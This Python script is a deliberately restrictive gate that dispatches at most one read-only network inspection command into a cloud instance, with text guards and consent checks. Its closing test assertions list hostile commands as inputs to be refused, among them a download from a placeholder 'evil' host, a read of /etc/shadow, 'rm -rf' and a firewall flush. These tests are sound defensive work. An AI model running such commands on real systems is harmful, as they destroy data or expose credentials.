#!/usr/bin/env python3
"""
guest_command_gate.py -- Confirmation gate for ONE in-guest inspection command
==============================================================================
WHY THIS EXISTS
  Most of the deciding evidence for a connectivity fault sits INSIDE the
  instance: the host firewall state, which address a service actually binds,
  guest routes and DNS, proxy settings, and what a live probe returns. No cloud
  query exposes any of that, so support historically asked the customer to run
  the commands by hand and paste back a screenshot -- which is exactly where
  many tickets stalled or died.

  This script is the ONLY place in the skill that can reach a customer
  instance, and it is deliberately built to say "no" far more often than
  "yes".

SECURITY CONTRACT (all four conditions must hold, or the gate refuses):
  1. The requested check group must be listed in APPROVED_COMMAND_CLASSES in
     _constants.py. That tuple ships EMPTY, so the automatic path is closed:
     the network inspection commands this tier needs are not yet covered by the
     low-risk command list the program follows, and the correct behavior is to
     print the command for the customer to run and paste back.
  2. The operator must pass --acknowledge-approval, declaring that condition 1
     is met by the deployment's own written approval.
  3. The operator must pass --confirm with the EXACT command text. Consent is
     scoped to one command for one run and never carries over.
  4. The command must pass the text guards: a single leading binary from the
     accepted set, an accepted argument form, and no side-effect or command
     chaining fragment.

  Anything that fails a guard is refused, and the refusal prints the manual
  customer path instead. This skill never runs a command that mutates state,
  and never runs more than one command per invocation.

  Credential handling: none. Authentication comes from the aliyun CLI default
  credential chain; this script never reads, prints or accepts key material,
  and never asks the customer for a password, control-panel login or key. The
  returned output is passed through the credential mask before display.

Usage:
  python3 scripts/areas/intranet_egress/guest_command_gate.py --region-id cn-hangzhou \
    --instance-id i-example001 --check-group routes-dns-proxy \
    --command "ip route show" --confirm "ip route show" --acknowledge-approval
  python3 scripts/areas/intranet_egress/guest_command_gate.py --list-accepted   # show the checklist

Exit codes:
  0  a command was dispatched and its result was read back
  3  the gate refused (approval closed, consent mismatch, or text guard failed)
  1  the dispatch or read-back failed after passing the gate
  2  credential/identity chain unusable, or argparse usage error
"""

from __future__ import annotations

import argparse
import base64
import json
import shlex
import sys
import time
from typing import Optional

import _cli
from _constants import (
    APPROVED_COMMAND_CLASSES,
    GUEST_EXEC_TIMEOUT,
    GUEST_MAX_POLLS,
    GUEST_POLL_INTERVAL,
    GUEST_CHECKS_LINUX,
    GUEST_CHECKS_WINDOWS,
    HIGH_RISK_ARGUMENT_FLAGS,
    INSPECTION_COMMAND_TOKENS,
    POSITIONAL_ALLOWLIST,
    SHORT_FLAG_CLUSTER_DENY,
    SIDE_EFFECT_FRAGMENTS,
    veto_mode,
)

# Cloud Assistant command types, selected from the instance operating system.
_COMMAND_TYPE = {
    "linux": "RunShellScript",
    "windows": "RunPowerShellScript",
}

# Invocation states Cloud Assistant reports; these end the read-back poll.
_TERMINAL_STATES = {
    "finished", "success", "failed", "partialfailed", "stopped", "timeout",
    "error", "invalid",
}


# ---------------------------------------------------------------------------
# Text guards (pure; every one is asserted at the bottom of this file)
# ---------------------------------------------------------------------------

def _cluster_violation(lead: str, tokens: list) -> Optional[str]:
    """Catch a denied letter smuggled inside a bundled short-flag cluster.

    "curl -sSo /tmp/x" never contains the token "-o", so for the binaries
    listed in SHORT_FLAG_CLUSTER_DENY each "-abc" cluster is decomposed and its
    letters checked. Returns the offending description, or None when clean.
    """
    denied = SHORT_FLAG_CLUSTER_DENY.get(lead)
    if not denied:
        return None
    for token in tokens:
        if not token.startswith("-") or token.startswith("--"):
            continue
        for letter in token[1:]:
            if letter in denied:
                return f"-{letter} (bundled in {token!r})"
    return None


def veto_reason(command: str) -> Optional[str]:
    """Return why the command text must not be dispatched, or None if clean.

    Checks, in order: emptiness, side-effect or chaining fragments, the leading
    binary, then that binary's argument policy. A positional binary (iptables,
    systemctl, ip, nft, cat, ...) requires EVERY remaining token to be
    allowlisted, so an unlisted flush or delete argument is refused even when a
    listing flag is present too.
    """
    text = (command or "").strip()
    if not text:
        return "the command is empty"
    lowered = text.lower()
    for fragment in SIDE_EFFECT_FRAGMENTS:
        if fragment in lowered:
            return (f"the command contains the side-effect or chaining "
                    f"fragment {fragment!r}")
    try:
        tokens = shlex.split(text)
    except ValueError as e:
        return f"the command cannot be parsed as a single command: {e}"
    if not tokens:
        return "the command parses to no tokens"
    lead = tokens[0].lower().split("/")[-1].split("\\")[-1]
    if lead not in INSPECTION_COMMAND_TOKENS:
        return (f"the leading binary {lead!r} is not an accepted inspection "
                f"command")
    rest = [t.lower() for t in tokens[1:]]
    mode = veto_mode(lead)
    if mode == "none":
        return f"no argument policy is defined for {lead!r}"
    if mode == "positional":
        accepted = POSITIONAL_ALLOWLIST[lead]
        if not rest:
            return f"{lead} was called without an accepted argument"
        rejected = [t for t in rest if t not in accepted]
        if rejected:
            return (f"{lead} is interpreted positionally and was called with "
                    f"arguments outside the accepted allowlist: {rejected}")
        return None
    for token in rest:
        if token in HIGH_RISK_ARGUMENT_FLAGS:
            return (f"{lead} was called with the high-risk argument "
                    f"{token!r}, which is not a state-inspection flag")
    bundled = _cluster_violation(lead, rest)
    if bundled:
        return (f"{lead} was called with the high-risk argument {bundled}, "
                f"which is not a state-inspection flag")
    return None


def check_group_allowed(group: str) -> bool:
    """True when the deployment approval currently covers this check group."""
    return group in APPROVED_COMMAND_CLASSES


def decide(args: argparse.Namespace) -> tuple:
    """Run the four-condition gate. Returns (allowed: bool, reasons: list)."""
    reasons = []
    if not check_group_allowed(args.check_group):
        reasons.append(
            f"check group {args.check_group!r} is not in "
            f"APPROVED_COMMAND_CLASSES (currently "
            f"{list(APPROVED_COMMAND_CLASSES) or 'empty'}), so automatic "
            "dispatch is closed for it")
    if not args.acknowledge_approval:
        reasons.append("--acknowledge-approval was not passed, so there is no "
                       "operator declaration that a written low-risk approval "
                       "covers this command class")
    if (args.confirm or "").strip() != (args.command or "").strip():
        reasons.append("--confirm does not echo the exact --command text, so "
                       "per-command informed consent is not established")
    veto = veto_reason(args.command)
    if veto:
        reasons.append(f"command text guard: {veto}")
    return (not reasons, reasons)


def manual_path(os_type: str, group: Optional[str]) -> list:
    """The customer-run checklist lines to print when the gate refuses."""
    src = GUEST_CHECKS_WINDOWS if os_type == "windows" else GUEST_CHECKS_LINUX
    groups = [group] if group and group in src else list(src)
    out = []
    for key in groups:
        for line in src.get(key) or []:
            out.append({"group": key, "command": line})
    return out


def disclosure(os_type: str, instance_id: str, region: str, command: str) -> str:
    """The mandatory what/where/impact/reversibility statement of record."""
    return (
        f"Planned action: run exactly ONE command on instance "
        f"{instance_id} in region {region} through Cloud Assistant "
        f"(command type {_COMMAND_TYPE.get(os_type, 'unknown')}).\n"
        f"  command          : {command}\n"
        "  purpose          : read current in-guest state that no cloud query "
        "can expose\n"
        "  data impact      : none; the command only reports state and does "
        "not create, modify, move or delete anything\n"
        "  persistence      : none; no rule, file, service or route is "
        "changed, so there is nothing to roll back\n"
        "  network side note: probe commands (curl/ping/telnet/traceroute) "
        "send packets from the instance toward the named target, so the "
        "target sees a request from this instance\n"
        "  blast radius     : this one instance, this one command, this one "
        "run\n"
        "  consent scope    : valid for this command only; a later command "
        "needs a new confirmation"
    )


# ---------------------------------------------------------------------------
# Dispatch + read-back
# ---------------------------------------------------------------------------

def dispatch(region: str, instance_id: str, command: str, os_type: str,
             timeout: int) -> str:
    """Invoke ecs RunCommand for one command on one instance.

    Returns the invoke id. Raises _cli.CliError on failure.
    """
    ctype = _COMMAND_TYPE.get(os_type)
    if not ctype:
        raise _cli.CliError(
            f"cannot map os type {os_type!r} to a Cloud Assistant command "
            "type; pass --os-type linux or windows explicitly")
    body = _cli.call("ecs", "RunCommand", {
        "RegionId": region,
        "Type": ctype,
        # The command is sent base64-encoded with the encoding declared
        # explicitly, so no default-encoding assumption can corrupt it.
        "ContentEncoding": "Base64",
        "CommandContent": base64.b64encode(command.encode("utf-8")).decode(),
        "InstanceId.1": instance_id,
        "Name": "ecs-intranet-egress-inspection",
        "Description": "Single state-inspection command dispatched by the "
                       "confirmed gate in area:intranet-egress",
        "Timeout": timeout,
    }, region=region, timeout=timeout)
    invoke_id = str(body.get("InvokeId") or "")
    if not invoke_id:
        raise _cli.CliError("ecs RunCommand returned no InvokeId")
    return invoke_id


def _dig(body, path):
    node = body
    for key in path:
        if not isinstance(node, dict):
            return None
        node = node.get(key)
    return node


def read_back(region: str, instance_id: str, invoke_id: str,
              timeout: int) -> dict:
    """Poll DescribeInvocations until the invocation reaches a terminal state.

    Never raises: a poll failure or a timeout degrades to a dict carrying the
    reason plus whatever state is known, so the caller can still hand the
    customer the manual path.
    """
    last: dict = {"invoke_id": invoke_id, "state": "unknown", "output": "",
                  "note": ""}
    for _ in range(GUEST_MAX_POLLS):
        try:
            body = _cli.call("ecs", "DescribeInvocations", {
                "RegionId": region,
                "InvokeId": invoke_id,
                "InstanceId": instance_id,
                "IncludeOutput": True,
            }, region=region, timeout=timeout)
        except _cli.CliError as e:
            last["note"] = f"read-back query failed: {str(e)[:200]}"
            return last
        inst = _dig(body, ["Invocations", "Invocation", 0, "InvokeInstances",
                           "InvokeInstance"])
        if isinstance(inst, list) and inst:
            item = inst[0] if isinstance(inst[0], dict) else {}
            last["state"] = str(item.get("InvocationStatus")
                                or item.get("InvokeRecordStatus")
                                or "unknown")
            raw = str(item.get("Output") or "")
            try:
                raw = base64.b64decode(raw).decode("utf-8", "replace")
            except (ValueError, TypeError):
                pass
            last["output"] = _cli.mask_credentials(raw)
            last["exit_code"] = item.get("ExitCode")
        if str(last["state"]).lower() in _TERMINAL_STATES:
            return last
        time.sleep(GUEST_POLL_INTERVAL)
    last["note"] = (
        f"the invocation did not report a terminal state within "
        f"{GUEST_MAX_POLLS * GUEST_POLL_INTERVAL}s; the Cloud Assistant agent "
        "on the instance may be offline, in which case the manual customer "
        "path below is the fallback")
    return last


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="guest_command_gate.py",
        description=("Confirmation gate that dispatches at most ONE "
                     "state-inspection command into an ECS instance, and "
                     "prints the manual customer path whenever it refuses"),
    )
    p.add_argument("--region-id", help="region of the target instance")
    p.add_argument("--instance-id", help="target instance ID (i-...)")
    p.add_argument("--os-type", choices=["linux", "windows"],
                   help="guest operating system; defaults to linux")
    p.add_argument("--check-group",
                   help="which inspection group the command belongs to, e.g. "
                        "routes-dns-proxy")
    p.add_argument("--command", help="the single command text to dispatch")
    p.add_argument("--confirm", help="must echo --command exactly, to record "
                                     "per-command consent")
    p.add_argument("--acknowledge-approval", action="store_true",
                   help="operator declaration that a written low-risk command "
                        "approval covers this check group")
    p.add_argument("--timeout", type=int, default=GUEST_EXEC_TIMEOUT,
                   help="guest-side execution timeout in seconds")
    p.add_argument("--list-accepted", action="store_true",
                   help="print the accepted check groups and exit")
    p.add_argument("--json", action="store_true", help="emit machine JSON")
    return p


def _print_checklist(os_type: str) -> None:
    print("Accepted in-guest check groups (printed for the customer to run "
          "and paste back):\n")
    for item in manual_path(os_type, None):
        print(f"  [{item['group']}] $ {item['command']}")


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    if args.list_accepted:
        _print_checklist(args.os_type or "linux")
        print("\nSTATUS: OK")
        print("NEXT_ACTION: hand the printed checklist to the customer; the "
              "automatic dispatch stays closed until the low-risk command "
              "list formally covers these classes")
        return

    os_type = (args.os_type or "linux").lower()
    result: dict = {
        "gate": "guest_command_gate",
        "instance_id": args.instance_id,
        "region": args.region_id,
        "check_group": args.check_group,
        "command": args.command,
        "approved_classes": list(APPROVED_COMMAND_CLASSES),
    }

    if not (args.region_id and args.instance_id and args.command):
        code = _refuse(result, args.json, os_type,
                       ["--region-id, --instance-id and --command are all "
                        "required to evaluate the gate"])
        sys.exit(code)

    allowed, reasons = decide(args)
    result["allowed"] = allowed
    result["refusal_reasons"] = reasons
    if not allowed:
        code = _refuse(result, args.json, os_type, reasons)
        sys.exit(code)

    print(disclosure(os_type, args.instance_id, args.region_id, args.command))
    _cli.check_cli_available()
    try:
        invoke_id = dispatch(args.region_id, args.instance_id, args.command,
                             os_type, args.timeout)
    except _cli.CliError as e:
        result.update({"dispatched": False, "status": "DEGRADED",
                       "error": _cli.mask_credentials(str(e))[:400]})
        result["manual_fallback"] = manual_path(os_type, args.check_group)
        _emit(result, args.json)
        print("\nSTATUS: DEGRADED")
        print("NEXT_ACTION: the dispatch failed; fall back to the printed "
              "customer checklist and continue from the pasted plain text")
        sys.exit(1)

    outcome = read_back(args.region_id, args.instance_id, invoke_id,
                        args.timeout)
    result.update({"dispatched": True, "invoke_id": invoke_id,
                   "guest_state": outcome.get("state"),
                   "guest_exit_code": outcome.get("exit_code"),
                   "guest_output": outcome.get("output"),
                   "note": outcome.get("note")})
    if str(outcome.get("state", "")).lower() not in _TERMINAL_STATES:
        result["manual_fallback"] = manual_path(os_type, args.check_group)
    _emit(result, args.json)
    print("\nSTATUS: OK" if not outcome.get("note") else "\nSTATUS: DEGRADED")
    print("NEXT_ACTION: interpret the returned guest output together with the "
          "cloud-side report; ask for a fresh confirmation before any further "
          "command")
    sys.exit(0)


def _refuse(result: dict, as_json: bool, os_type: str, reasons: list) -> int:
    """Print the refusal plus the manual customer path. Returns exit code 3."""
    result.update({
        "allowed": False,
        "refusal_reasons": reasons,
        "status": "DEGRADED",
        "verdict": "GATE-CLOSED",
        "manual_path": manual_path(os_type, result.get("check_group")),
        "manual_path_note": (
            "Print these commands to the customer, ask for plain-text output "
            "(not a screenshot), and never ask for a password, control-panel "
            "login or private key."),
    })
    if not as_json:
        print("=" * 68)
        print("GUEST COMMAND GATE: REFUSED")
        print("=" * 68)
        for r in reasons:
            print(f"  - {r}")
        print("\nWhy this stays manual: the network inspection commands this "
              "tier needs are not yet covered by the low-risk command list "
              "the program follows, so the skill must not dispatch them on "
              "its own.")
        print("\nGive these commands to the customer to run inside the "
              "instance and paste back as plain text:")
        for item in result["manual_path"]:
            print(f"  [{item['group']}] $ {item['command']}")
    else:
        print(json.dumps(result, indent=2, ensure_ascii=False, default=str))
    print("\nSTATUS: DEGRADED")
    print("NEXT_ACTION: hand the printed checklist to the customer instead of "
          "dispatching; do not retry with looser flags")
    return 3


def _emit(result: dict, as_json: bool) -> None:
    if as_json:
        print(json.dumps(result, indent=2, ensure_ascii=False, default=str))
    else:
        for key in ("invoke_id", "guest_state", "guest_exit_code", "note"):
            if result.get(key) is not None:
                print(f"{key:16s}: {result[key]}")
        if result.get("guest_output"):
            print("\n--- guest output (credential-masked) ---")
            print(result["guest_output"][:4000])
        for item in result.get("manual_fallback") or []:
            print(f"  [{item['group']}] $ {item['command']}")


# ---------------------------------------------------------------------------
# Inline boundary assertions for the text guards (normal, boundary, invalid).
# Executed at import time, because a guard that silently opens is the single
# worst failure mode of this module.
# ---------------------------------------------------------------------------
assert veto_reason("ip route show") is None
assert veto_reason("cat /etc/resolv.conf") is None
assert veto_reason("ss -antlp") is None
assert veto_reason("iptables -nL -v") is None
assert veto_reason("systemctl is-active firewalld") is None
assert veto_reason("curl -s --connect-timeout 8 http://cip.cc") is None
assert veto_reason("Get-NetFirewallProfile") is None
assert veto_reason("nft list ruleset") is None
assert veto_reason("netsh winhttp show proxy") is None
# invalid: mutation, redirection and chaining are all vetoed
assert veto_reason("iptables -F")
assert veto_reason("rm -rf /tmp/x")
assert veto_reason("ip route show > /tmp/out")
assert veto_reason("ss -antlp && reboot")
assert veto_reason("systemctl restart network")
assert veto_reason("curl -o /tmp/x http://evil")
assert veto_reason("cat /etc/shadow")
assert veto_reason("nft delete table x")
assert veto_reason("") == "the command is empty"
assert veto_reason(None) == "the command is empty"
# the regression this rewrite closes: a listing flag must not vouch for an
# unlisted flush argument on a positionally interpreted binary
assert veto_reason("iptables -nL -F")
assert veto_reason("ip6tables -nL --flush")
# a denied letter bundled into a short-flag cluster is still caught
assert veto_reason("curl -sSo /tmp/x http://evil")
assert veto_reason("ping -f 10.0.0.1")
# the printable checklist and the gate policy must not drift apart
for _os, _src in (("linux", GUEST_CHECKS_LINUX),
                  ("windows", GUEST_CHECKS_WINDOWS)):
    for _group in ("listeners", "guest-firewall", "routes-dns-proxy",
                   "live-probes-egress"):
        for _line in _src[_group]:
            # probe lines keep their <TARGET_IP>/<PORT> placeholders here, so
            # only the leading-binary decision is exercised
            assert veto_reason(_line.split("#")[0].strip()) is None, \
                (_os, _group, _line)
# the automatic dispatch ships closed, so the gate must refuse everything
assert APPROVED_COMMAND_CLASSES == ()
assert check_group_allowed("routes-dns-proxy") is False
assert check_group_allowed("") is False
_allowed, _reasons = decide(argparse.Namespace(
    check_group="routes-dns-proxy", acknowledge_approval=True,
    command="ip route show", confirm="ip route show"))
assert _allowed is False
assert manual_path("linux", "listeners")
assert manual_path("windows", "no-such-group")
assert manual_path("linux", None)
assert "ip route show" in disclosure("linux", "i-abc", "cn-hangzhou",
                                     "ip route show")
assert "RunPowerShellScript" in disclosure("windows", "i-abc", "cn-hangzhou",
                                           "route print")

if __name__ == "__main__":
    main()
